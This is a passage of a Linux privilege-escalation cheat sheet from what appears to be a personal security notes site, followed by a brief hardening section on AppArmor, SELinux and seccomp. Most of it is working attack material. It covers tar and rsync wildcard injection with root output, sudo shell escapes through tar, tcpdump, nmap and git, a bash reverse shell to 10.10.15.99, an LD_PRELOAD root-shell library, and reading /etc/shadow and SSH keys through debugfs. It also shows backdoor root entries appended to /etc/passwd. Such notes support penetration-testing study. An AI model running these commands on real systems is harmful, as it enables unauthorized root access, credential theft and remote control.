    execute ACTION on each checkpoint
</code></pre></div>
    <div class="highlight"><pre><span></span><code><span class="c1"># ls -la</span>
-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">28</span> <span class="m">19</span>:19 --checkpoint<span class="o">=</span><span class="m">1</span>
-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">28</span> <span class="m">19</span>:17 --checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>sh shell.sh
-rw-rw-r--.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
-rw-rw-r--.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
-rwxr-xr-x.  <span class="m">1</span> leon leon    <span class="m">12</span> Oct <span class="m">28</span> <span class="m">19</span>:17 shell.sh

<span class="c1">#  tar cf archive.tar *</span>
<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</code></pre></div></li>
<li>Rcync command Execution
    <div class="highlight"><pre><span></span><code>-e, --rsh<span class="o">=</span>COMMAND           specify the remote shell to use
    --rsync-path<span class="o">=</span>PROGRAM    specify the rsync to run on remote machine
</code></pre></div>
    <div class="highlight"><pre><span></span><code><span class="c1"># ls -al</span>
-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Mar <span class="m">28</span> <span class="m">04</span>:45 -e sh shell.c
-rwxr-xr-x.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
-rwxr-xr-x.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
-rwxr-xr-x.  <span class="m">1</span> leon leon    <span class="m">31</span> Mar <span class="m">28</span> <span class="m">04</span>:45 shell.c

<span class="c1"># rsync -t *.c foo:src/</span>
rsync: connection unexpectedly closed <span class="o">(</span><span class="m">0</span> bytes received so far<span class="o">)</span> <span class="o">[</span>sender<span class="o">]</span>
rsync error: error <span class="k">in</span> rsync protocol data stream <span class="o">(</span>code <span class="m">12</span><span class="o">)</span> at io.c<span class="o">(</span><span class="m">601</span><span class="o">)</span> <span class="o">[</span><span class="nv">sender</span><span class="o">=</span><span class="m">3</span>.0.8<span class="o">]</span>

<span class="c1"># ls -al</span>
-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Mar <span class="m">28</span> <span class="m">04</span>:45 -e sh shell.c
-rwxr-xr-x.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
-rwxr-xr-x.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
-rwxr-xr-x.  <span class="m">1</span> leon leon    <span class="m">31</span> Mar <span class="m">28</span> <span class="m">04</span>:45 shell.c
-rw-r--r--.  <span class="m">1</span> root root   <span class="m">101</span> Mar <span class="m">28</span> <span class="m">04</span>:49 shell_output.txt

<span class="c1"># cat shell.c</span>
/usr/bin/id &gt; shell_output.txt

<span class="c1"># cat shell_output.txt</span>
<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</code></pre></div></li>
<li>Practice<ul>
<li>HTB - Joker</li>
</ul>
</li>
<li>Create a script, setuid bit and then use this attack to <code>chown</code> the script to gain prev-esc</li>
</ul>
<p><strong>Exploits Related to Tools</strong></p>
<ul>
<li>Tar: <code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</code>
    <div class="highlight"><pre><span></span><code><span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n\nbash -i &gt;&amp; /dev/tcp/10.10.15.99/8082 0&gt;&amp;1&#39;</span> &gt; a.sh
tar -cvf a.tar a.sh
sudo tar -xvf a.tar --to-command /bin/bash
</code></pre></div></li>
<li>Zip: <code>sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"</code></li>
<li>Strace: <code>sudo strace -o/dev/null /bin/bash</code></li>
<li>tcpdump
    <div class="highlight"><pre><span></span><code><span class="nb">echo</span> $’id<span class="se">\n</span>cat /etc/shadow’ &gt; /tmp/.shell
chmod +x /tmp/.shell
sudo tcpdump -ln -i eth0 -w /dev/null -W <span class="m">1</span> -G <span class="m">1</span> -z /tmp/.shell-Z root
</code></pre></div></li>
<li>nmap
    <div class="highlight"><pre><span></span><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
</code></pre></div></li>
<li>scp: <code>sudo scp -S /path/yourscript x y</code></li>
<li>except: <code>sudo except spawn sh then sh</code></li>
<li>nano: <code>sudo nano -S /bin/bash</code><ul>
<li>type your command and hit CTRL+T</li>
</ul>
</li>
<li>git: <code>sudo git help status</code><ul>
<li>type: !/bin/bash</li>
</ul>
</li>
<li>gdb/ftp: <code>sudo ftp</code><ul>
<li>type : !/bin/sh</li>
</ul>
</li>
</ul>
<p><strong>Other</strong> </p>
<ul>
<li>File execution due to not using quotes
    <div class="highlight"><pre><span></span><code><span class="c1"># Files in `SLAPPER_FILES` list will get executed:</span>
<span class="k">for</span> i <span class="k">in</span> <span class="si">${</span><span class="nv">SLAPPER_FILES</span><span class="si">}</span><span class="p">;</span> <span class="k">do</span>
<span class="k">if</span> <span class="o">[</span> -f <span class="si">${</span><span class="nv">i</span><span class="si">}</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nv">file_port</span><span class="o">=</span><span class="nv">$file_port</span> <span class="nv">$i</span>
    <span class="c1"># Correction: file_port=&quot;$file_port $i&quot;</span>
    <span class="nv">STATUS</span><span class="o">=</span><span class="m">1</span>
<span class="k">fi</span>
<span class="k">done</span>
</code></pre></div><ul>
<li>Ref: <a href="https://www.exploit-db.com/exploits/33899">https://www.exploit-db.com/exploits/33899</a></li>
</ul>
</li>
<li>Connect to existing TMUX session: <code>tmux -S /.devs/dev_sess​</code></li>
<li>Screenshot<ul>
<li>Need <code>video</code> group access</li>
<li>Resolution: <code>cat /sys/class/graphics/fb0/virtual_size</code></li>
<li>Video feed: Open <code>​/dev/fb0​</code> in a image editor
  <div class="highlight"><pre><span></span><code>cp /dev/fb0 screenshot.raw
iraw2png <span class="m">1024</span> <span class="m">768</span> &lt; screenshot.raw &gt; screenshot.png

fbdump
</code></pre></div></li>
<li><a href="https://www.kernel.org/doc/Documentation/fb/framebuffer.txt">https://www.kernel.org/doc/Documentation/fb/framebuffer.txt</a></li>
</ul>
</li>
<li>Important Groups <ul>
<li><code>shadow</code> - can read /etc/shadow</li>
<li><code>disk</code> - raw access to files <ul>
<li><code>debugfs /dev/sda1</code></li>
<li><code>debugfs: cat /root/.ssh/id_rsa</code></li>
<li><code>debugfs: cat /etc/shadow</code></li>
</ul>
</li>
<li><code>video</code> - access to framebuffer<ul>
<li><code>cat /dev/fb0 &gt; /tmp/screen.raw</code></li>
<li><code>cat /sys/class/graphics/fb0/virtual_size</code></li>
</ul>
</li>
<li><code>root</code><ul>
<li><code>find / -group root -perm -g=w 2&gt;/dev/null</code></li>
</ul>
</li>
</ul>
</li>
<li>Privilege Escalation: <a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm</a><ul>
<li>Abusing users with '.' in their PATH</li>
<li>Shell Escape Sequences</li>
<li>IFS Exploit</li>
<li>LD_PRELOAD Exploit<ul>
<li>cat /etc/ld.so.conf</li>
<li>cat /etc/ld.so.conf.d/*
<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="c1"> </span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">{</span> 
<span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_PRELOAD&quot;</span><span class="p">);</span>
<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">// gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span>
<span class="c1">// sudo LD_PRELOAD=/home/admin/shell.so apache2</span>
</code></pre></div></li>
</ul>
</li>
<li>Symlinks</li>
<li>Get root shell from a limited account<ul>
<li>From root: <code>chmod +s /bin/bash</code></li>
<li>From limited account: <code>/bin/bash</code></li>
</ul>
</li>
</ul>
</li>
<li>Find plain text username / password
    <div class="highlight"><pre><span></span><code>grep -i user <span class="o">[</span>filename<span class="o">]</span>
grep -i pass <span class="o">[</span>filename<span class="o">]</span>
grep -C <span class="m">5</span> <span class="s2">&quot;password&quot;</span> <span class="o">[</span>filename<span class="o">]</span>
find . -name <span class="s2">&quot;*.php&quot;</span> -print0 <span class="p">|</span> xargs -0 grep -i -n <span class="s2">&quot;var </span><span class="nv">$password</span><span class="s2">&quot;</span>   <span class="c1"># Joomla</span>
</code></pre></div></li>
<li>Commands with sudo: <code>sudo -l</code></li>
<li>New file Permissions: <code>umask</code></li>
<li>Generate password hash (md5): <code>openssl passwd -1</code> <code>echo 'joske' | openssl passwd -1 -stdin</code></li>
<li>Generate password hash (sha256): <code>python -c "import crypt; print crypt.crypt('joske')"</code></li>
<li>Add user with passwd
    <div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s1">&#39;user2:*:1002:1003:,,,:/home/user2:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
passwd user2

<span class="nb">echo</span> <span class="s2">&quot;user2:`openssl passwd -1 -salt user3 pass123`:1002:1003:,,,:/home/user2:/bin/bash&quot;</span> &gt;&gt; /etc/passwd

<span class="nb">echo</span> <span class="s2">&quot;user2:`mkpasswd -m SHA-512 pass`:1002:1003:,,,:/home/user2:/bin/bash&quot;</span> &gt;&gt; /etc/passwd

<span class="nb">echo</span> <span class="s2">&quot;user2:`python -c &#39;import crypt; print crypt.crypt(&quot;</span>pass<span class="s2">&quot;, &quot;</span><span class="nv">$6$salt</span><span class="s2">&quot;)&#39;`:1002:1003:,,,:/home/user2:/bin/bash&quot;</span> &gt;&gt; /etc/passwd

<span class="nb">echo</span> <span class="s2">&quot;user2:`perl -le &#39;print crypt(&quot;</span>pass123<span class="s2">&quot;, &quot;</span>abc<span class="s2">&quot;)&#39;`:1002:1003:,,,:/home/user2:/bin/bash&quot;</span> &gt;&gt; /etc/passwd

<span class="nb">echo</span> <span class="s2">&quot;user2:`php -r &quot;</span>print<span class="o">(</span>crypt<span class="o">(</span><span class="s1">&#39;aarti&#39;</span>,<span class="s1">&#39;123&#39;</span><span class="o">)</span> . <span class="se">\&quot;\n\&quot;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;`:1002:1003:,,,:/home/user2:/bin/bash&quot;</span> &gt;&gt; /etc/passwd
</code></pre></div></li>
<li>Add root user
    <div class="highlight"><pre><span></span><code>adduser username
usermod -aG sudo username
</code></pre></div>
    <div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s1">&#39;trevelyn::0:0:root:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
</code></pre></div></li>
<li>Change user password
    <div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;trevelyn:trevelyn&quot;</span><span class="p">|</span> /usr/sbin/chpasswd
</code></pre></div></li>
</ul>
<p><strong>References</strong></p>
<ul>
<li><a href="http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/">http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/</a></li>
<li>Linux Local Privilege Escalation via SUID /proc/pid/mem Write - <a href="https://git.zx2c4.com/CVE-2012-0056/about/">https://git.zx2c4.com/CVE-2012-0056/about/</a></li>
<li><a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</a></li>
</ul>
<h2 id="important-files">Important Files<a class="headerlink" href="#important-files" title="Permanent link">&para;</a></h2>
<ul>
<li>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions: <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
<li>Files owned by User: <code>find / -type f -uid 1000 -ls 2&gt;/dev/null</code></li>
<li>Environment variables: <code>/proc/self/environ</code></li>
<li>Email: <code>/var/log/mail/USER</code></li>
<li>Private keys: <code>~/.ssh/id_rsa</code></li>
<li>APT sources: <code>/etc/apt/sources.list</code></li>
<li>Order of name resolution: <code>/etc/nsswitch.conf</code></li>
<li>DNS Hosts File: <code>/etc/hosts</code></li>
<li>DNS sever Information: <code>/etc/resolv.conf</code></li>
<li>Kernel module config: <code>/etc/sysctl.conf</code></li>
<li>Sys calls: <code>/usr/include /i386-linux-gnu/asm/unistd_32.h</code></li>
<li>Os Info: <code>/etc/issue</code> <code>/proc/version</code></li>
<li>Cron: <code>/etc/crontab</code></li>
<li>Bootloader - GRUB2<ul>
<li>Main configuration file (replaces <code>menu.lst</code> in GRUB (v1)): <code>/boot/grub/grub.cfg</code></li>
<li>Directory contains the scripts that build the <code>grub.cfg</code>: <code>/etc/grub.d</code><ul>
<li><code>00_header</code> - Loads the settings from <code>/etc/default/grub</code></li>
<li><code>05_debian_theme</code> - Defines the colors, background, etc.</li>
<li><code>10_linux</code> - Loads the menu entries</li>
<li><code>20_memtest86</code> - Loads the memory tester</li>
<li><code>30_os-prober</code> - Scans the hard drives for other operating systems</li>
<li><code>40_custom</code> - Template for manually adding other menu entries</li>
</ul>
</li>
<li>File contains the GRUB menu settings: <code>/etc/default/grub</code><ul>
<li>Run <code>update-grub</code> after modifying.</li>
</ul>
</li>
</ul>
</li>
<li>Samba: <code>/etc/samba/smb.conf</code></li>
<li>Logs:<ul>
<li>Syslog: <code>/etc/rsyslog.conf</code></li>
<li>Log mail events of all priorities to /var/log/mail: <code>mail.* /var/log/mail</code></li>
<li>Log all events of the emergency priority (emerg) to all logged on users: <code>.emerg</code></li>
</ul>
</li>
<li>Squid Proxy: <code>/etc/squid/squid.conf</code> <code>/etc/squid/passwords</code></li>
<li>Apache:<ul>
<li><code>/var/log/apache2/access.log</code></li>
<li><code>/etc/apache2/sites-enabled/000-default.conf</code></li>
<li><code>/etc/apache/sites-enabled/000-default.conf</code></li>
<li><code>/etc/httpd/sites-enabled/000-default.conf</code></li>
</ul>
</li>
<li>TFTPD: <code>/etc/default/tftpd-hpa</code></li>
<li>PHP Sessions: <code>/tmp/sess_ID</code> <code>/var/lib/php5/sess_ID</code></li>
</ul>
<div class="highlight"><pre><span></span><code>/etc/issue
/proc/version
/etc/profile
/root/.bash_history
/var/log/dmessage
/var/mail/root
/var/spool/cron/crontabs/root
</code></pre></div>
<p><strong>Passwords</strong></p>
<div class="highlight"><pre><span></span><code>/etc/passwd
/etc/shadow

/etc/pwd.db
/etc/passwd

/etc/spwd.db
/etc/shadow

/etc/master.passwd
</code></pre></div>
<h2 id="special-file-handling">Special File Handling<a class="headerlink" href="#special-file-handling" title="Permanent link">&para;</a></h2>
<ul>
<li>7z files<ul>
<li>Print file information: <code>7z l -slt example.zip</code></li>
<li>Extract: <code>7z x example.zip</code></li>
</ul>
</li>
<li>Microsoft Outlook Personal Folder (PST)<ul>
<li>Examine: <code>readpst -tea -m example.pst</code></li>
</ul>
</li>
</ul>
<h2 id="defense">Defense<a class="headerlink" href="#defense" title="Permanent link">&para;</a></h2>
<p><strong>References</strong></p>
<ul>
<li>PAM vs NSS: <a href="https://serverfault.com/questions/538383/understand-pam-and-nss/">https://serverfault.com/questions/538383/understand-pam-and-nss/</a></li>
<li>Support to authenticate against PostgreSQL for PAM-enabled appliations: <a href="https://github.com/pam-pgsql/pam-pgsql">https://github.com/pam-pgsql/pam-pgsql</a></li>
</ul>
<p>Point of no C3 | Linux Kernel Exploitation</p>
<ul>
<li><a href="https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585">https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585</a></li>
<li><a href="https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850">https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850</a></li>
</ul>
<p><strong>Tools</strong></p>
<ul>
<li>Locally checks for signs of a rootkit: <a href="http://www.chkrootkit.org/">http://www.chkrootkit.org/</a></li>
</ul>
<p><strong>Checklists</strong></p>
<ul>
<li>Linux hardening checklist: <a href="https://github.com/trimstray/linux-hardening-checklist">https://github.com/trimstray/linux-hardening-checklist</a></li>
<li>Kernel hardning checklist: <a href="https://github.com/a13xp0p0v/kconfig-hardened-check">https://github.com/a13xp0p0v/kconfig-hardened-check</a></li>
</ul>
<h3 id="apparmor">AppArmor<a class="headerlink" href="#apparmor" title="Permanent link">&para;</a></h3>
<ul>
<li>2.6.36 + </li>
<li>allows to restrict programs capabilities with per-program profiles.</li>
<li>Linux kernel security module that allows the system administrator to restrict programs’ capabilities with per-program profiles</li>
<li>supplements the traditional Unix discretionary access control (DAC) model by providing mandatory access control (MAC).</li>
</ul>
<h3 id="selinux">SELinux<a class="headerlink" href="#selinux" title="Permanent link">&para;</a></h3>
<ul>
<li>provides a mechanism for supporting access control security policies, including…(MAC)</li>
<li>set of kernel modifications and user-space tools</li>
<li>separate enforcement of security decisions from the security policy </li>
<li>streamlines the volume of software charged with security policy enforcement </li>
</ul>
<h3 id="seccomp">Seccomp<a class="headerlink" href="#seccomp" title="Permanent link">&para;</a></h3>
<ul>
<li>2.6.12 +</li>
<li>used for filtering syscalls issued by a program</li>
<li>secure computing mode, [seccomp] is a computer security facility in the Linux kernel</li>
<li>allows a process to make a one-way transition into a “secure” state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors</li>
<li>kernel will terminate the process with SIGKILL, if anyother syscall was tried</li>
<li>does not virtualize the system’s resources but isolates the process from them entirely</li>
</ul>
<h3 id="capabilties">Capabilties<a class="headerlink" href="#capabilties" title="Permanent link">&para;</a></h3>
<ul>
<li>for performing permission checks.</li>
</ul>
<h3 id="grsecurity">Grsecurity<a class="headerlink" href="#grsecurity" title="Permanent link">&para;</a></h3>
<ul>
<li>A set of patches for the Linux kernel which emphasize security enhancements</li>
<li>collection of security features to the Linux kernel, including address space protection, enhanced auditing and process control </li>
</ul>
<h3 id="pax">PAX<a class="headerlink" href="#pax" title="Permanent link">&para;</a></h3>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../linux-issues/" title="Linux issues" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Linux issues
              </span>
            </div>
          </a>
        
        
          <a href="../malware/" title="Malware" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Malware
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.39abc4af.js"></script>
      
      <script>app.initialize({version:"1.1.2",url:{base:".."}})</script>
      
    
  </body>
</html>